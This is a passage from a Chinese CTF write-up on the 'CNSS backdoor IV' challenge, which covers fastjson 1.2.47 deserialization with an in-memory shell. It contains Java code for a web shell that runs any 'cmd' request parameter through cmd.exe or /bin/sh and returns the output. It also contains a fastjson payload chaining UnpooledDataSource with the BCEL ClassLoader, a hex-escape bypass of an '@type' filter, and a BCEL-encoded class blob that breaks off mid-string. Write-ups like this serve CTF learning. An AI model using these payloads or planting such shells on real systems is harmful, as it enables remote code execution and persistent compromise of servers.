class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getResponse();        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);        <span class="hljs-keyword">if</span> (command!=<span class="hljs-literal">null</span>)&#123;            <span class="hljs-keyword">try</span> &#123;                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                ProcessBuilder p;                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;);                &#125; <span class="hljs-keyword">else</span> &#123;                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125;);                &#125;                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);                o = c.hasNext() ? c.next() : o;                c.close();                printWriter.write(o);                printWriter.flush();                printWriter.close();            &#125;<span class="hljs-keyword">catch</span> (Exception ignored)&#123;            &#125;        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><h1 id="追加一道CNSS-backdoor-IV-fastjson1-2-47-内存马回显"><a href="#追加一道CNSS-backdoor-IV-fastjson1-2-47-内存马回显" class="headerlink" title="追加一道CNSS backdoor IV (fastjson1.2.47+内存马回显)"></a>追加一道CNSS backdoor IV (fastjson1.2.47+内存马回显)</h1><p><img src="/2023/09/10/sictf2023/image-20230917112517449.png" alt="image-20230917112517449"></p><p>可以利用batis回显</p><p>这个利用类<code>org.apache.ibatis.datasource.unpooled.UnpooledDataSource</code></p><p>过滤了@type，unescape方法使unicode无法绕过，我们可以使用hex绕过 ,    <code>\x40type</code></p><p><img src="/2023/09/10/sictf2023/image-20230917111729652.png" alt="image-20230917111729652"></p><p> 经过尝试</p><p><code>&#123;&quot;1_Ry&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog地址&quot;&#125;&#125;</code></p><p>这里发现无记录，说明不出网</p><p>所以这里使用<code>BCEL</code>的方式</p><p>也不知道为什么命令执行不行，反正就一直没有东西，看了别人的思路是使用内存马</p><p>因为这里只是复现，再加上不懂原理，只能演示操作了</p><p>找到fastjson1.2.47的BCEL ClassLoader payload</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;xxx&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;www&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;$$BCEL$$....&quot;</span>&#125;&#125;:&#123;&#125;&#125;&#125;</code></pre></div><p>直接抄大佬结果<a href="https://boogipop.com/2023/08/10/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/#Context">BCEL环境下利用全反射构造高可用内存马 | Boogiepop Doesn’t Laugh (boogipop.com)</a></p><p>把最后的内存马，编译</p><div class="code-wrapper"><pre><code class="hljs pgsql">JavaClass javaClass= Repository.lookupClass(BcelInjectToController.<span class="hljs-keyword">class</span>);String code= Utility.encode(javaClass.getBytes(),<span class="hljs-keyword">true</span>);code+=&quot;$$BCEL$$&quot;;<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(code);</code></pre></div><div class="code-wrapper"><pre><code class="hljs gams"><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>BCEL<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span><span class="hljs-number">8</span>b<span class="hljs-symbol">$</span>I<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>a5YIp<span class="hljs-symbol">$</span><span class="hljs-number">5</span>b<span class="hljs-symbol">$</span>d9u<span class="hljs-symbol">$</span>bd<span class="hljs-symbol">$</span>df<span class="hljs-symbol">$</span>a2D<span class="hljs-symbol">$</span><span class="hljs-number">88</span><span class="hljs-symbol">$</span>a2<span class="hljs-symbol">$</span>shj<span class="hljs-symbol">$</span>c8m<span class="hljs-symbol">$</span>a7<span class="hljs-symbol">$</span>dd<span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span>dd<span class="hljs-symbol">$</span>z<span class="hljs-symbol">$</span>b5<span class="hljs-symbol">$</span>ba<span class="hljs-symbol">$</span>v<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span>bbc<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>oDq<span class="hljs-symbol">$</span>W<span class="hljs-symbol">$</span>J<span class="hljs-symbol">$</span><span class="hljs-number">91</span><span class="hljs-symbol">$</span>m<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b1<span class="hljs-symbol">$</span>f3<span class="hljs-symbol">$</span><span class="hljs-number">87</span><span class="hljs-symbol">$</span>f7A<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>m<span class="hljs-symbol">$</span><span class="hljs-number">40</span><span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>EIg<span class="hljs-symbol">$</span><span class="hljs-number">8</span>e<span class="hljs-symbol">$</span><span class="hljs-number">3</span>bq<span class="hljs-symbol">$</span><span class="hljs-number">92</span>Ngr<span class="hljs-symbol">$</span>ec8<span class="hljs-symbol">$</span><span class="hljs-number">833</span><span class="hljs-symbol">$</span>b8<span class="hljs-symbol">$</span>x<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span>e2<span class="hljs-symbol">$</span><span class="hljs-number">85</span><span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>ea<span class="hljs-symbol">$</span>aa<span class="hljs-symbol">$</span>a4<span class="hljs-symbol">$</span><span class="hljs-number">3</span>a<span class="hljs-symbol">$</span>h<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span><span class="hljs-number">92</span>l<span class="hljs-symbol">$</span>b2pe<span class="hljs-symbol">$</span><span class="hljs-number">91</span>uV<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span>a4<span class="hljs-symbol">$</span>b2<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span>a9J<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span><span class="hljs-number">9</span>c<span class="hljs-symbol">$</span>Hhj<span class="hljs-symbol">$</span>a9<span class="hljs-symbol">$</span>j<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>m<span class="hljs-symbol">$</span>fe<span class="hljs-symbol">$</span>h<span class="hljs-symbol">$</span>ee<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>b9<span class="hljs-symbol">$</span>e7<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>fc<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span><span class="hljs-number">7</span>c<span class="hljs-symbol">$</span>f8w<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span><span class="hljs-number">93</span>o<span class="hljs-symbol">$</span>P<span class="hljs-symbol">$</span>c9E<span class="hljs-symbol">$</span>f9<span class="hljs-symbol">$</span><span class="hljs-number">89</span><span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span>f9I<span class="hljs-symbol">$</span>f9<span class="hljs-symbol">$</span>S_6<span class="hljs-symbol">$</span>f8<span class="hljs-symbol">$</span>f8SC<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>U<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span><span class="hljs-number">3</span>e<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span>GC<span class="hljs-symbol">$</span>S<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>e6K<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span><span class="hljs-number">90</span>jB6<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>a5<span class="hljs-symbol">$</span><span class="hljs-number">96</span><span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>ad<span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span>Z<span class="hljs-symbol">$</span>e6<span class="hljs-symbol">$</span>c0<span class="hljs-symbol">$</span>f6<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>d4e<span class="hljs-symbol">$</span>t<span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span>a5AipusPv<span class="hljs-symbol">$</span>T<span class="hljs-symbol">$</span>b27<span class="hljs-symbol">$</span>q<span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span>rN<span class="hljs-symbol">$</span>c8tBZ<span class="hljs-symbol">$</span>J<span class="hljs-symbol">$</span><span class="hljs-number">99</span><span class="hljs-symbol">$</span>Z<span class="hljs-symbol">$</span><span class="hljs-number">94</span>vB<span class="hljs-symbol">$</span><span class="hljs-number">3</span>a<span class="hljs-symbol">$</span>J<span class="hljs-symbol">$</span><span class="hljs-number">99</span>M<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span><span class="hljs-number">7</span>eB<span class="hljs-symbol">$</span>e68<span class="hljs-symbol">$</span>a9<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>a5<span class="hljs-symbol">$</span><span class="hljs-number">9</span>b<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span><span class="hljs-number">83</span><span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>ir<span class="hljs-symbol">$</span>d7QB<span class="hljs-symbol">$</span>be<span class="hljs-symbol">$</span>cc<span class="hljs-symbol">$</span>bf<span class="hljs-symbol">$</span><span class="hljs-number">3</span>f<span class="hljs-symbol">$</span><span class="hljs-number">9</span>d<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span><span class="hljs-number">9</span>fI<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>fd<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>ac<span class="hljs-symbol">$</span>O<span class="hljs-symbol">$</span>ca<span class="hljs-symbol">$</span>cf<span class="hljs-symbol">$</span><span class="hljs-number">9</span>e<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span><span class="hljs-number">9</span>f<span class="hljs-symbol">$</span><span class="hljs-number">93</span><span class="hljs-symbol">$</span><span class="hljs-number">9</span>fO<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>M<span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>ca<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span>caW<span class="hljs-symbol">$</span>y9<span class="hljs-symbol">$</span>f1<span class="hljs-symbol">$</span><span class="hljs-number">85</span>Z<span class="hljs-symbol">$</span>a3<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span>db<span class="hljs-symbol">$</span><span class="hljs-number">92</span>K<span class="hljs-symbol">$</span>d7f<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span><span class="hljs-number">7</span>d<span class="hljs-symbol">$</span>eff<span class="hljs-symbol">$</span>ddkTo<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>e3Z<span class="hljs-symbol">$</span>a3z<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>fa<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>r<span class="hljs-symbol">$</span>D<span class="hljs-symbol">$</span>T<span class="hljs-symbol">$</span>cdP<span class="hljs-symbol">$</span><span class="hljs-number">5</span>brv<span class="hljs-symbol">$</span>b6<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>d0<span class="hljs-symbol">$</span>f3<span class="hljs-symbol">$</span><span class="hljs-number">9</span>d<span class="hljs-symbol">$</span>j_<span class="hljs-symbol">$</span>c7e<span class="hljs-symbol">$</span>cf<span class="hljs-symbol">$</span>afc<span class="hljs-symbol">$</span>q9<span class="hljs-symbol">$</span>db<span class="hljs-symbol">$</span>M<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span>fa<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>X<span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span>f8<span class="hljs-symbol">$</span>dc<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span>iho<span class="hljs-symbol">$</span>d6Z<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span><span class="hljs-number">3</span>a<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>b9_<span class="hljs-symbol">$</span>ab<span class="hljs-symbol">$</span>df<span class="hljs-symbol">$</span>b2<span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span><span class="hljs-number">98</span><span class="hljs-symbol">$</span>e7y<span class="hljs-symbol">$</span><span class="hljs-number">5</span>c<span class="hljs-symbol">$</span>fa<span class="hljs-symbol">$</span><span class="hljs-number">8</span>chL<span class="hljs-symbol">$</span><span class="hljs-number">5</span>d<span class="hljs-symbol">$</span>a3<span class="hljs-symbol">$</span>f8<span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span>ad<span class="hljs-symbol">$</span><span class="hljs-number">5</span>d<span class="hljs-symbol">$</span><span class="hljs-number">3</span>eO<span class="hljs-symbol">$</span>d4<span class="hljs-symbol">$</span>bdV<span class="hljs-symbol">$</span>ab<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span>f4BK<span class="hljs-symbol">$</span>ae<span class="hljs-symbol">$</span><span class="hljs-number">3</span>c<span class="hljs-symbol">$</span>b1<span class="hljs-symbol">$</span>d8<span class="hljs-symbol">$</span>M<span class="hljs-symbol">$</span>cfbX<span class="hljs-symbol">$</span>c7<span class="hljs-symbol">$</span>d8q<span class="hljs-symbol">$</span>s<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>adf<span class="hljs-symbol">$</span>t<span class="hljs-symbol">$</span>Ot<span class="hljs-symbol">$</span>abT<span class="hljs-symbol">$</span>d3u<span class="hljs-symbol">$</span>yM<span class="hljs-symbol">$</span><span class="hljs-number">3</span>d<span class="hljs-symbol">$</span>b14<span class="hljs-symbol">$</span>d6Q<span class="hljs-symbol">$</span><span class="hljs-number">5</span>d<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>ed<span class="hljs-symbol">$</span><span class="hljs-number">9</span>bf<span class="hljs-symbol">$</span>ea<span class="hljs-symbol">$</span>W<span class="hljs-symbol">$</span>F<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>bdF<span class="hljs-symbol">$</span>e8<span class="hljs-symbol">$</span>c5a<span class="hljs-symbol">$</span>d0l<span class="hljs-symbol">$</span>b4<span class="hljs-symbol">$</span>f5A<span class="hljs-symbol">$</span>fbi<span class="hljs-symbol">$</span>z<span class="hljs-symbol">$</span>W<span class="hljs-symbol">$</span>fc<span class="hljs-symbol">$</span>z<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span>c6<span class="hljs-symbol">$</span>b2<span class="hljs-symbol">$</span>e1<span class="hljs-symbol">$</span>fet_<span class="hljs-symbol">$</span>e2<span class="hljs-symbol">$</span>a5rs<span class="hljs-symbol">$</span>t<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>da<span class="hljs-symbol">$</span><span class="hljs-number">93</span><span class="hljs-symbol">$</span>b03<span class="hljs-symbol">$</span>Mu8<span class="hljs-symbol">$</span>f1p<span class="hljs-symbol">$</span>ef<span class="hljs-symbol">$</span>e9<span class="hljs-symbol">$</span>fe<span class="hljs-symbol">$</span>b2l<span class="hljs-symbol">$</span><span class="hljs-number">7</span>f<span class="hljs-symbol">$</span><span class="hljs-number">5</span>drlw<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span><span class="hljs-number">5</span>e<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>caZ<span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span>f1h<span class="hljs-symbol">$</span>d1Y<span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span>e3<span class="hljs-symbol">$</span>fcN<span class="hljs-symbol">$</span>fb<span class="hljs-symbol">$</span><span class="hljs-number">91</span><span class="hljs-symbol">$</span><span class="hljs-number">82</span><span class="hljs-symbol">$</span>a7<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span><span class="hljs-number">8</span>f<span class="hljs-symbol">$</span>ccy<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span><span class="hljs-number">96</span><span class="hljs-symbol">$</span>f4<span class="hljs-symbol">$</span><span class="hljs-number">7</span>d<span class="hljs-symbol">$</span>dci<span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span>ea7<span class="hljs-symbol">$</span>n1<span class="hljs-symbol">$</span>e8<span class="hljs-symbol">$</span>c4<span class="hljs-symbol">$</span>b1n<span class="hljs-symbol">$</span>b4oN<span class="hljs-symbol">$</span><span class="hljs-number">3</span>cz<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span>b56<span class="hljs-symbol">$</span>b1<span class="hljs-symbol">$</span>S<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>i<span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span>d4lB<span class="hljs-symbol">$</span>f2<span class="hljs-symbol">$</span><span class="hljs-number">60</span>U<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>c7<span class="hljs-symbol">$</span>b5<span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span>b0<span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span>easL<span class="hljs-symbol">$</span><span class="hljs-number">9</span>e<span class="hljs-symbol">$</span>d3<span class="hljs-symbol">$</span>ed<span class="hljs-symbol">$</span>cd<span class="hljs-symbol">$</span>sm<span class="hljs-symbol">$</span><span class="hljs-number">7e1</span><span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span><span class="hljs-number">7</span>b<span class="hljs-symbol">$</span>j<span class="hljs-symbol">$</span>ddjC<span class="hljs-symbol">$</span>c2<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>f6N<span class="hljs-symbol">$</span>c1<span class="hljs-symbol">$</span>Bu<span class="hljs-symbol">$</span>j<span class="hljs-symbol">$</span>f7<span class="hljs-symbol">$</span><span class="hljs-number">9</span>f<span class="hljs-symbol">$</span>y9<span class="hljs-symbol">$</span><span class="hljs-number">85</span><span class="hljs-symbol">$</span>p<span class="hljs-symbol">$</span>a3Z<span class="hljs-symbol">$</span>b5<span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>db<span class="hljs-symbol">$</span><span class="hljs-number">89</span><span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span><span class="hljs-number">93</span><span class="hljs-symbol">$</span>r<span class="hljs-symbol">$</span>c7w<span class="hljs-symbol">$</span>bd<span class="hljs-symbol">$</span>f6<span class="hljs-symbol">$</span>s<span class="hljs-symbol">$</span><span class="hljs-number">826</span><span class="hljs-symbol">$</span>d8<span class="hljs-symbol">$</span>dc<span class="hljs-symbol">$</span>a59xw<span class="hljs-symbol">$</span>dc<span class="hljs-symbol">$</span>ef<span class="hljs-symbol">$</span>d4<span class="hljs-symbol">$</span>b8<span class="hljs-symbol">$</span>qa<span class="hljs-symbol">$</span>fe<span class="hljs-symbol">$</span>ea8<span class="hljs-symbol">$</span>f3<span class="hljs-symbol">$</span>f8m<span class="hljs-symbol">$</span>W<span class="hljs-symbol">$</span>b6<span class="hljs-symbol">$</span><span class="hljs-number">3</span>f<span class="hljs-symbol">$</span><span class="hljs-number">7</span>d<span class="hljs-symbol">$</span>ca<span class="hljs-symbol">$</span>ddF<span class="hljs-symbol">$</span>d4<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>ed<span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span>a0<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>c1<span class="hljs-symbol">$</span>e3pa<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>e14<span class="hljs-symbol">$</span>B<span class="hljs-symbol">$</span>dc1<span class="hljs-symbol">$</span>faA<span class="hljs-symbol">$</span>c6<span class="hljs-symbol">$</span><span class="hljs-number">9</span>c<span class="hljs-symbol">$</span>deim<span class="hljs-symbol">$</span>eaz<span class="hljs-symbol">$</span>dd<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>f3<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span>P2<span class="hljs-symbol">$</span>b4<span class="hljs-symbol">$</span><span class="hljs-number">3</span>f<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span><span class="hljs-number">9</span>f<span class="hljs-symbol">$</span><span class="hljs-number">3</span>bs<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>c1<span class="hljs-symbol">$</span>e0<span class="hljs-symbol">$</span><span class="hljs-number">3</span>c<span class="hljs-symbol">$</span><span class="hljs-number">5</span>e<span class="hljs-symbol">$</span><span class="hljs-number">7</span>c6<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>d5Z<span class="hljs-symbol">$</span>ab<span class="hljs-symbol">$</span>fd<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>rC<span class="hljs-symbol">$</span><span class="hljs-number">93</span><span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span><span class="hljs-number">81</span><span class="hljs-symbol">$</span>eei<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>u<span class="hljs-symbol">$</span>ef<span class="hljs-symbol">$</span>e2y<span class="hljs-symbol">$</span>d9<span class="hljs-symbol">$</span>e0<span class="hljs-symbol">$</span>a2T<span class="hljs-symbol">$</span>p<span class="hljs-symbol">$</span>GO<span class="hljs-symbol">$</span>S<span class="hljs-symbol">$</span><span class="hljs-number">7</span>b<span class="hljs-symbol">$</span>p<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span><span class="hljs-number">3</span>f<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span>pR<span class="hljs-symbol">$</span>i<span class="hljs-symbol">$</span><span class="hljs-number">94</span>_<span class="hljs-symbol">$</span>k<span class="hljs-symbol">$</span><span class="hljs-number">96</span>_<span class="hljs-symbol">$</span><span class="hljs-number">91</span><span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>O<span class="hljs-symbol">$</span>cb<span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>ca<span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span>cb<span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>cb<span class="hljs-symbol">$</span><span class="hljs-number">7</span>b<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>f2<span class="hljs-symbol">$</span>h<span class="hljs-symbol">$</span>f2<span class="hljs-symbol">$</span>k<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span><span class="hljs-number">3</span>d<span class="hljs-symbol">$</span><span class="hljs-number">82</span><span class="hljs-symbol">$</span>d3<span class="hljs-symbol">$</span>b0<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>bf9<span class="hljs-symbol">$</span>u<span class="hljs-symbol">$</span>bf5<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span>bf<span class="hljs-symbol">$</span>z<span class="hljs-symbol">$</span>bf3<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span>bf<span class="hljs-symbol">$</span>x_<span class="hljs-symbol">$</span><span class="hljs-number">837</span><span class="hljs-symbol">$</span>k<span class="hljs-symbol">$</span>e1f<span class="hljs-symbol">$</span>e8q<span class="hljs-symbol">$</span>Q<span class="hljs-symbol">$</span>zy<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span><span class="hljs-number">87</span><span class="hljs-symbol">$</span>L<span class="hljs-symbol">$</span>a0<span class="hljs-symbol">$</span>r<span class="hljs-symbol">$</span>a3<span class="hljs-symbol">$</span>cd<span class="hljs-symbol">$</span>b8<span class="hljs-symbol">$</span><span class="hljs-number">3</span>a<span class="hljs-symbol">$</span>d2<span class="hljs-symbol">$</span><span class="hljs-number">8</span>ba<span class="hljs-symbol">$</span>U<span class="hljs-symbol">$</span><span class="hljs-number">7</span>b<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>ba<span class="hljs-symbol">$</span>db<span class="hljs-symbol">$</span><span class="hljs-number">8</span>c<span class="hljs-symbol">$</span>b7G<span class="hljs-symbol">$</span>ba<span class="hljs-symbol">$</span>da<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span>e9<span class="hljs-symbol">$</span>cb<span class="hljs-symbol">$</span>jY<span class="hljs-symbol">$</span>d5<span class="hljs-symbol">$</span>fe<span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span>m<span 